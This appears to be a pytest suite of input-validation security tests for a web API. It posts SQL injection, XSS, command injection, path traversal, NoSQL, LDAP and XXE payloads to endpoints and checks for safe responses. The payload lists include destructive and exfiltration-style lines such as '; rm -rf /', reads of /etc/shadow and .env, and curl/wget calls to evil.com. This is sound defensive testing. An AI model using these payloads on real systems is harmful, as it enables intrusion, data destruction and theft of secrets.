"""Security tests for input validation.

Tests for:
- SQL Injection
- XSS (Cross-Site Scripting)
- Command Injection
- Path Traversal
- Oversized request bodies
"""

import pytest
from httpx import AsyncClient


class TestSQLInjection:
    """Test SQL injection prevention."""

    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "'; DELETE FROM users; --",
        "'; UPDATE users SET is_superuser=true; --",
        "' UNION SELECT * FROM users --",
        "' UNION SELECT username, password FROM users --",
        "1 OR 1=1",
        "1; DROP TABLE users; --",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "'; SELECT * FROM information_schema.tables; --",
        "'; SELECT * FROM pg_tables; --",
        "'; SELECT @@version; --",
        "'; SELECT version(); --",
    ]

    async def test_sql_injection_in_login_username(self, client):
        """Test SQL injection in login username field."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": payload, "password": "test"},
            )
            # Should return 401 or 400, not 500
            assert response.status_code in [401, 400, 422], f"Payload {payload} caused unexpected status"

    async def test_sql_injection_in_login_password(self, client):
        """Test SQL injection in login password field."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "test", "password": payload},
            )
            # Should return 401
            assert response.status_code == 401

    async def test_sql_injection_in_user_registration(self, client):
        """Test SQL injection in user registration fields."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await client.post(
                "/api/v1/auth/register",
                json={
                    "email": f"test{hash(payload) % 10000}@example.com",
                    "username": payload[:50] if len(payload) > 50 else payload,
                    "password": "SecurePassword123!",
                    "full_name": payload[:50] if len(payload) > 50 else payload,
                },
            )
            # Should either succeed or fail validation, not cause SQL error
            assert response.status_code in [201, 400, 422]

    async def test_sql_injection_in_user_update(self, client, test_user, user_token):
        """Test SQL injection in user update fields."""
        headers = {"Authorization": f"Bearer {user_token}"}

        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await client.put(
                f"/api/v1/users/{test_user.id}",
                json={"full_name": payload[:50] if len(payload) > 50 else payload},
                headers=headers,
            )
            # Should either succeed or fail validation
            assert response.status_code in [200, 400, 422]

    async def test_sql_injection_in_url_parameters(self, client, superuser_token):
        """Test SQL injection in URL parameters."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await client.get(f"/api/v1/users/{payload}", headers=headers)
            # Should return 404 or 400, not 500
            assert response.status_code in [404, 400, 422]

    async def test_sql_injection_in_search_params(self, client, superuser_token):
        """Test SQL injection in search parameters."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await client.get(
                "/api/v1/users/",
                params={"search": payload},
                headers=headers,
            )
            # Should return 200, 400, or 422
            assert response.status_code in [200, 400, 422]

    async def test_sql_injection_in_order_by(self, client, superuser_token):
        """Test SQL injection in ORDER BY clause."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        injection_payloads = [
            "id; DROP TABLE users; --",
            "id, (SELECT * FROM users)",
        ]

        for payload in injection_payloads:
            response = await client.get(
                "/api/v1/users/",
                params={"sort_by": payload},
                headers=headers,
            )
            assert response.status_code in [200, 400, 422]

    async def test_no_sql_error_exposure(self, client, test_user, user_token):
        """Test SQL errors are not exposed in responses."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Try to trigger a SQL error
        response = await client.get("/api/v1/users/' OR 1=1", headers=headers)
        data = response.json()

        # Check response doesn't contain SQL error details
        response_str = str(data).lower()
        sql_error_keywords = [
            "sql",
            "syntax",
            "error",
            "near",
            "line",
            "mysql",
            "postgresql",
            "sqlite",
        ]

        for keyword in sql_error_keywords:
            assert keyword not in response_str, f"SQL error exposed: {keyword}"


class TestXSSAttack:
    """Test XSS (Cross-Site Scripting) prevention."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<svg onload=alert('XSS')>",
        '<math><mtext></mtext><maction xlink:href="javascript:alert(1)">click</maction></math>',
        "javascript:alert('XSS')",
        "<a href=\"javascript:alert('XSS')\">click</a>",
        "<object data=\"javascript:alert('XSS')\">",
        "<embed src=\"javascript:alert('XSS')\">",
        "<form action=\"javascript:alert('XSS')\"><input type=submit>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<isindex type=image src=1 onerror=alert('XSS')>",
    ]

    async def test_xss_in_user_registration(self, client):
        """Test XSS payload in user registration."""
        for i, payload in enumerate(self.XSS_PAYLOADS):
            response = await client.post(
                "/api/v1/auth/register",
                json={
                    "email": f"xsstest{i}@example.com",
                    "username": f"xsstest{i}",
                    "password": "SecurePassword123!",
                    "full_name": payload,
                },
            )
            assert response.status_code in [201, 400, 422]

    async def test_xss_in_user_update(self, client, test_user, user_token):
        """Test XSS payload in user update."""
        headers = {"Authorization": f"Bearer {user_token}"}

        for payload in self.XSS_PAYLOADS:
            response = await client.put(
                f"/api/v1/users/{test_user.id}",
                json={"full_name": payload},
                headers=headers,
            )
            assert response.status_code in [200, 400, 422]

            # If successful, verify payload is not reflected without escaping
            if response.status_code == 200:
                data = response.json()
                full_name = data.get("data", {}).get("full_name", "")
                # The payload should be stored as-is (sanitization happens at output layer)
                assert full_name == payload or "<script>" not in full_name

    async def test_xss_in_login_username(self, client):
        """Test XSS payload in login username."""
        for payload in self.XSS_PAYLOADS[:5]:  # Test first 5
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": payload, "password": "test"},
            )
            assert response.status_code in [401, 400, 422]

    async def test_xss_in_json_body(self, client, user_token):
        """Test XSS payload in various JSON fields."""
        headers = {"Authorization": f"Bearer {user_token}"}

        xss_object = {
            "nested": "<script>alert('nested')</script>",
            "array": ["<img src=x onerror=alert(1)>", "<svg onload=alert(2)>"],
            "deep": {
                "nested": {
                    "value": "javascript:alert('deep')",
                },
            },
        }

        # Test with various endpoints that accept JSON
        endpoints = [
            "/api/v1/users/me",  # Might not accept PUT
        ]

        for endpoint in endpoints:
            response = await client.request(
                "POST",
                endpoint,
                json=xss_object,
                headers=headers,
            )
            # Should not crash
            assert response.status_code in [200, 201, 400, 405, 422]

    async def test_xss_in_html_response(self, client):
        """Test HTML responses are properly escaped."""
        # Check documentation endpoints
        response = await client.get("/docs")
        assert response.status_code == 200

        # Check for XSS in documentation
        content = response.text
        assert "<script>" not in content or "swagger-ui" in content.lower()


class TestCommandInjection:
    """Test command injection prevention."""

    COMMAND_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "; ls -la",
        "; id",
        "; whoami",
        "; uname -a",
        "| cat /etc/passwd",
        "| ls",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; cat /proc/self/environ",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "; rm -rf /",
        "; ping -c 4 127.0.0.1",
        "; curl http://evil.com",
        "; wget http://evil.com",
        "| bash",
        "| sh",
        "; python -c 'import os; os.system(\"id\")'",
    ]

    async def test_command_injection_in_filename(self, client, superuser_token):
        """Test command injection in filename parameters."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.COMMAND_INJECTION_PAYLOADS:
            response = await client.get(
                "/api/v1/exports/products/",
                params={"filename": payload},
                headers=headers,
            )
            # Should return 400 or 202, not 500
            assert response.status_code in [202, 400, 404, 422]

    async def test_command_injection_in_export_format(self, client, superuser_token):
        """Test command injection in export format."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.COMMAND_INJECTION_PAYLOADS:
            response = await client.post(
                "/api/v1/exports/orders/",
                json={"format": payload},
                headers=headers,
            )
            assert response.status_code in [202, 400, 422]

    async def test_command_injection_in_task_command(self, client, superuser_token):
        """Test command injection in task-related inputs."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.COMMAND_INJECTION_PAYLOADS[:5]:
            response = await client.post(
                "/api/v1/tasks/",
                json={
                    "name": payload[:50],
                    "task_type": "shell",
                    "payload": {"command": payload},
                },
                headers=headers,
            )
            assert response.status_code in [201, 400, 422]

    async def test_path_traversal_in_file_access(self, client, superuser_token):
        """Test path traversal in file access attempts."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../app/config.py",
            "../../.env",
            "../../../etc/hosts",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            "..\\../../etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for payload in path_traversal_payloads:
            response = await client.get(
                "/api/v1/exports/",
                params={"file": payload},
                headers=headers,
            )
            assert response.status_code in [404, 400, 422]


class TestPathTraversal:
    """Test path traversal prevention."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../app/config.py",
        "../../.env",
        "../../../etc/hosts",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....//....//....//etc/passwd",
        "..\\../../etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/version",
        "/app/.env",
        "/app/config.py",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\etc\\passwd",
        "....\\....\\....\\etc\\passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]

    async def test_path_traversal_in_export_download(self, client, superuser_token):
        """Test path traversal in export download requests."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            response = await client.get(
                f"/api/v1/exports/download/{payload}",
                headers=headers,
            )
            # Should return 404, not allow file access
            assert response.status_code in [404, 400, 422]

    async def test_path_traversal_in_file_upload(self, client, superuser_token):
        """Test path traversal in file upload filename."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        for payload in self.PATH_TRAVERSAL_PAYLOADS[:5]:
            # Create a simple text file
            files = {
                "file": (payload, b"test content", "text/plain"),
            }

            response = await client.post(
                "/api/v1/exports/",
                files=files,
                headers=headers,
            )
            assert response.status_code in [404, 400, 405]

    async def test_path_traversal_in_static_file_request(self, client):
        """Test path traversal in static file requests."""
        for payload in self.PATH_TRAVERSAL_PAYLOADS[:10]:
            response = await client.get(f"/static/{payload}")
            assert response.status_code == 404

    async def test_null_byte_injection(self, client, superuser_token):
        """Test null byte injection in file paths."""
        headers = {"Authorization": f"Bearer {superuser_token}"}

        null_payloads = [
            "file.txt%00.jpg",
            "../../../etc/passwd%00.txt",
            "shell.php%00.jpg",
        ]

        for payload in null_payloads:
            response = await client.get(
                f"/api/v1/exports/{payload}",
                headers=headers,
            )
            assert response.status_code in [404, 400]


class TestOversizedRequest:
    """Test handling of oversized request bodies."""

    async def test_oversized_json_body(self, client, user_token):
        """Test oversized JSON request body."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Create a large JSON payload (e.g., 100MB)
        large_data = {"key": "x" * (100 * 1024 * 1024)}  # 100MB

        response = await client.post(
            "/api/v1/auth/login",
            json={"username": large_data["key"][:100], "password": "test"},
        )

        # Request should not crash
        assert response.status_code in [400, 413, 422]

    async def test_oversized_string_field(self, client, user_token):
        """Test oversized string in field."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Create a very long string
        oversized_string = "A" * 1000000  # 1MB of As

        response = await client.post(
            "/api/v1/auth/register",
            json={
                "email": f"test@example.com",
                "username": oversized_string[:50],  # Username might have limit
                "password": "SecurePassword123!",
                "full_name": oversized_string[:100],  # Name might have limit
            },
        )
        assert response.status_code in [201, 400, 422]

    async def test_deeply_nested_json(self, client, user_token):
        """Test deeply nested JSON structures."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Create deeply nested JSON
        data = {}
        current = data
        for i in range(1000):
            current["nested"] = {}
            current = current["nested"]

        response = await client.post(
            "/api/v1/auth/login",
            json={"username": "test", "password": "test", "extra": data},
        )
        assert response.status_code in [400, 413, 422]

    async def test_massive_array(self, client, user_token):
        """Test massive array in JSON."""
        headers = {"Authorization": f"Bearer {user_token}"}

        # Create a massive array
        data = {"items": list(range(1000000))}

        response = await client.post(
            "/api/v1/auth/login",
            json={"username": "test", "password": "test", "extra": data},
        )
        assert response.status_code in [400, 413, 422]

    async def test_oversized_url_parameters(self, client):
        """Test oversized URL parameters."""
        # Create a very long query string
        long_param = "x" * 10000

        response = await client.get(f"/api/v1/users/?search={long_param}")
        assert response.status_code in [400, 414, 422]

    async def test_oversized_header(self, client):
        """Test oversized HTTP headers."""
        # Create a request with oversized header
        headers = {"Authorization": f"Bearer {'x' * 10000}"}

        response = await client.get("/api/v1/users/me", headers=headers)
        assert response.status_code in [400, 431, 401]


class TestNoSQLInjection:
    """Test NoSQL injection prevention (if using NoSQL)."""

    NOSQL_PAYLOADS = [
        {"$gt": ""},
        {"$ne": None},
        {"$regex": ".*"},
        {"$where": "this.password.length > 0"},
        {"$or": [{}, {"foo": "bar"}]},
    ]

    async def test_nosql_injection_in_json(self, client, user_token):
        """Test NoSQL injection in JSON payloads."""
        headers = {"Authorization": f"Bearer {user_token}"}

        for payload in self.NOSQL_PAYLOADS:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": payload if isinstance(payload, str) else str(payload), "password": "test"},
            )
            assert response.status_code in [401, 400, 422]


class TestLDAPInjection:
    """Test LDAP injection prevention (if using LDAP)."""

    LDAP_PAYLOADS = [
        "*)(uid=*))(&(uid=*",
        "*)(objectClass=*))(&(objectClass=*",
        "admin)(|(password=*",
        "*)(uid=*))(&(uid=*",
        "admin))(|(password=",
    ]

    async def test_ldap_injection_in_username(self, client):
        """Test LDAP injection in username field."""
        for payload in self.LDAP_PAYLOADS:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": payload, "password": "test"},
            )
            assert response.status_code in [401, 400, 422]


class TestXXE:
    """Test XXE (XML External Entity) prevention (if accepting XML)."""

    XXE_PAYLOADS = [
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo>&xxe;</foo>""",
        """<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://evil.com/xxe">
        ]>
        <foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>""",
    ]

    async def test_xxe_injection(self, client, superuser_token):
        """Test XXE injection in XML input."""
        headers = {
            "Authorization": f"Bearer {superuser_token}",
            "Content-Type": "application/xml",
        }

        for payload in self.XXE_PAYLOADS:
            response = await client.post(
                "/api/v1/exports/",
                content=payload,
                headers=headers,
            )
            # Should not process external entities
            assert response.status_code in [400, 415, 422]
